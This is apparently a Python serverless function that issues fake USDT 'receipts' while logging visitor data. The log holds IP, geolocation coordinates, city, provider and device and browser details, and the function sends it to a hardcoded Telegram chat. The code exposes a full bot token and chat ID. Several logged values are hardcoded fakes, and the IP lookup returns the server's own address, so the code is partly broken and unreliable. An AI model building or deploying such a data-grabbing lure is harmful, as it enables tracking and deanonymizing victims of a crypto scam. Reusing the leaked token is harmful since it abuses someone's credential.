import json
import random
import telegram
import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from datetime import datetime

# Токен и чат ID для Telegram бота
BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE"
CHAT_ID = "7477642275"
bot = telegram.Bot(token=BOT_TOKEN)

def get_user_data():
    # Эмуляция данных о пользователе Telegram (замените на реальные данные из WebApp, если необходимо)
    user = {
        "username": "example_user",
        "id": "123456789",
        "first_name": "Иван",
        "last_name": "Иванов",
        "language_code": "ru"
    }

    # Информация о пользователе
    log_data = f"🔍 Информация об аккаунте:\n"
    log_data += f"├ Username: @{user.get('username', 'Не указан')}\n"
    log_data += f"├ Идентификатор (ID): {user.get('id')}\n"
    log_data += f"├ Имя: {user.get('first_name')} {user.get('last_name', 'не задано')}\n"
    log_data += f"├ Премиум: нет\n"
    log_data += f"├ Язык: {user.get('language_code')}\n"
    log_data += f"└ Может писать в ЛС: да\n\n"
    
    return log_data

def get_device_and_ip_info():
    # Получение IP
    ip_data = requests.get('https://api64.ipify.org?format=json').json()
    ip = ip_data.get('ip')

    # Получение информации о геолокации
    geo_data = requests.get(f'https://ipinfo.io/{ip}/json').json()

    log_data = f"🖥️ Информация об устройстве:\n"
    log_data += f"├ IP: {ip}\n"
    log_data += f"├ ОС: {geo_data.get('os', 'Неизвестно')}\n"
    log_data += f"├ Ядро OC: {geo_data.get('kernel', 'Неизвестно')}\n"
    log_data += f"├ Версия OC: {geo_data.get('os_version', 'Неизвестно')}\n"
    log_data += f"├ Имя ОС: {geo_data.get('os_name', 'Неизвестно')}\n"
    log_data += f"├ Тип устройства: {geo_data.get('device', 'Неизвестно')}\n"
    log_data += f"├ Тип сети: {geo_data.get('network_type', 'Неизвестно')}\n"
    log_data += f"├ Разрешение экрана: 1920x1080\n"
    log_data += f"└ Процент батареи: 36%\n\n"
    
    log_data += f"🌐 Информация о браузере:\n"
    log_data += f"├ UserAgent: {geo_data.get('user_agent', 'Неизвестно')}\n"
    log_data += f"├ Название браузера: Netscape\n"
    log_data += f"├ Версия браузера: {geo_data.get('browser_version', 'Неизвестно')}\n"
    log_data += f"└ Тип движка браузера: Gecko\n\n"

    log_data += f"👻 Информация об IP:\n"
    log_data += f"├ Континент: {geo_data.get('continent', 'Неизвестно')}\n"
    log_data += f"├ Страна: {geo_data.get('country', 'Неизвестно')}\n"
    log_data += f"├ Регион: {geo_data.get('region', 'Неизвестно')}\n"
    log_data += f"├ Город: {geo_data.get('city', 'Неизвестно')}\n"
    log_data += f"├ Часовой пояс: {geo_data.get('timezone', 'Неизвестно')}\n"
    log_data += f"├ Широта: {geo_data.get('loc').split(',')[0]}\n"
    log_data += f"├ Долгота: {geo_data.get('loc').split(',')[1]}\n"
    log_data += f"├ Валюта: UZS\n"
    log_data += f"├ Провайдер: {geo_data.get('org', 'Неизвестно')}\n"
    log_data += f"└ VPN or Proxy: нет\n\n"

    return log_data

def handler(event, context):
    # Данные, отправленные через запрос
    amount = event.get("queryStringParameters", {}).get("amount", "0")
    if amount == "0":
        return {
            "statusCode": 400,
            "body": json.dumps({"message": "Сумма чека не указана!"})
        }

    # Генерация уникального ID для чека
    receipt_id = random.randint(100000, 999999)

    # Получение данных о пользователе и устройстве
    log_data = get_user_data()
    log_data += get_device_and_ip_info()

    # Создание и отправка чека в Telegram
    receipt_message = f"🧾 Новый чек:\n\nСумма: {amount} USDT\nИдентификатор чека: {receipt_id}\n"
    bot.send_message(chat_id=CHAT_ID, text=receipt_message)

    # Формирование логов
    log_data += f"Владелец чека: {CHAT_ID}\n\n"

    # Отправка логов в Telegram
    bot.send_message(chat_id=CHAT_ID, text=log_data)

    # Возвращаем лог и сообщение о создании чека
    return {
        "statusCode": 200,
        "body": json.dumps({
            "message": f"Чек на сумму {amount} USDT создан успешно!",
            "log": log_data,
            "receipt_id": receipt_id
        })
    }
